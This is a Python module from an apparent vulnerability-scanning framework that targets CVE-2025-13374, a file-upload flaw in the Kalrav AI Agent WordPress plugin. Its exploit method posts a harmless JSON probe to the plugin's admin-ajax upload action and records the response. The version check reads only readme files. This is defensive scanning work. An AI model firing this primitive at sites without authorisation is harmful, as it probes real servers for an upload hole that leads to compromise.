# Made by Sn0w8ird

from __future__ import annotations

import json

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE202513374Kalrav(WordPressModule):
    name = "CVE-2025-13374"
    severity = 9.8
    affected_versions = ["Kalrav AI Agent: verify against vendor advisory"]
    cwe = "CWE-434 (context-specific)"
    plugin_readme_paths = (
        "/wp-content/plugins/kalrav-ai-agent/readme.txt",
        "/wp-content/plugins/kalrav/readme.txt",
    )
    slug_hint = "kalrav"

    async def exploit_remote_primitive(
        self,
        target: Target,
        client: CPointedClient,
        *,
        timeout: float,
    ) -> dict:
        """Stream/chat multipart: JSON messages blob (align with SA tool-call surface)."""
        ajax = self._path(target, "/wp-admin/admin-ajax.php")
        out: dict = {"admin_ajax_posts": []}
        try:
            payload = json.dumps(
                {
                    "session_id": "cpointed-audit-session",
                    "messages": [{"role": "user", "content": "authorized inference probe"}],
                }
            ).encode("utf-8")
            files = {"stream_payload": ("request.json", payload, "application/json")}
            data = {"action": "kalrav_process_agent_stream", "model": "default"}
            r = await client.request("POST", ajax, data=data, files=files, timeout=timeout)
            out["admin_ajax_posts"].append(
                {
                    "path": ajax,
                    "action": data["action"],
                    "status_code": r.status_code,
                    "body_snippet": (r.text or "")[:2000],
                }
            )
        except Exception as exc:  # pragma: no cover - network
            out["admin_ajax_posts"].append({"action": "kalrav_process_agent_stream", "error": str(exc)})
        return out

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
